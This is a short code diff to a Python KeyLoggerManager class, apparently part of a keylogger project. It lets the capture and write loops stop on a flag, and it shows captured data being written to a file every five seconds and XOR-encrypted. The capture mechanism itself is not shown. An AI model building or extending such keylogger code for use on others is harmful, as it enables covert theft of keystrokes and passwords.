@@ -12,13 +12,16 @@ class KeyLoggerManager:
 
     def start(self):
         self.instance.start()
-        while True:
-           a=3
+        while self.instance.return_action():
+            True
+        return
 
     def write_to_file(self):
-        while True:
+        while self.instance.return_action():
             FileWriter.write_to_file(self.instance.get_data())
             time.sleep(5)
+
+
     def xor_encryption(self):
         Encryptor.xor_encryption(self.instance.get_data())
 
